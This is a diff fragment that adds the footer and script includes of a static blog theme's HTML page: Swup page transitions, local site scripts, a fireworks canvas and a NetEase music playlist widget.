+        </div>
+        <div id="search-result">
+            <div id="no-result">
+                <i class="fa-solid fa-spinner fa-spin-pulse fa-5x fa-fw"></i>
+            </div>
+        </div>
+    </div>
+</div>
+
+    
+</main>
+
+
+    
+<script src="/js/libs/Swup.min.js"></script>
+
+<script src="/js/libs/SwupSlideTheme.min.js"></script>
+
+<script src="/js/libs/SwupScriptsPlugin.min.js"></script>
+
+<script src="/js/libs/SwupProgressPlugin.min.js"></script>
+
+<script src="/js/libs/SwupScrollPlugin.min.js"></script>
+
+<script>
+    const swup = new Swup({
+        plugins: [
+            new SwupScriptsPlugin({
+                optin: true,
+            }),
+            new SwupProgressPlugin(),
+            new SwupScrollPlugin({
+                offset: 80,
+            }),
+            new SwupSlideTheme({
+                mainElement: ".main-content-body",
+            }),
+        ],
+        containers: ["#swup"],
+    });
+
+    swup.hooks.on("page:view", () => {
+        Global.refresh();
+    });
+
+    // if (document.readyState === "complete") {
+    //
+    // } else {
+    //     document.addEventListener("DOMContentLoaded", () => init());
+    // }
+</script>
+
+
+
+
+
+
+<script src="/js/utils.js" type="module"></script>
+
+<script src="/js/main.js" type="module"></script>
+
+<script src="/js/layouts/navbarShrink.js" type="module"></script>
+
+<script src="/js/tools/scrollTopBottom.js" type="module"></script>
+
+<script src="/js/tools/lightDarkSwitch.js" type="module"></script>
+
+<script src="/js/layouts/categoryList.js" type="module"></script>
+
+
+
+    
+<script src="/js/tools/localSearch.js"></script>
+
+
+
+
+    
+<script src="/js/tools/codeBlock.js"></script>
+
+
+
+
+    
+<script src="/js/layouts/lazyload.js"></script>
+
+
+
+
+    
+<script src="/js/tools/runtime.js"></script>
+
+    
+<script src="/js/libs/odometer.min.js"></script>
+
+    
+<link rel="stylesheet" href="/assets/odometer-theme-minimal.css">
+
+
+
+
+  
+<script src="/js/libs/Typed.min.js"></script>
+
+  
+<script src="/js/plugins/typed.js"></script>
+
+
+
+
+
+
+
+<div class="post-scripts" data-swup-reload-script>
+    
+        
+<script src="/js/libs/anime.min.js"></script>
+
+        
+<script src="/js/tools/tocToggle.js" type="module"></script>
+
+<script src="/js/layouts/toc.js" type="module"></script>
+
+<script src="/js/plugins/tabs.js" type="module"></script>
+
+    
+</div>
+
+
+<canvas class="fireworks" style="position:fixed;left:0;top:0;z-index:1;pointer-events:none;"></canvas>
+<meting-js
+    server="netease"
+    type="playlist"
+    id="7637965554"
+	fixed="true"
+	showlrc="false"
+	lrc-type="0"
+	muted>
+</meting-js>
+</body>
+</html>
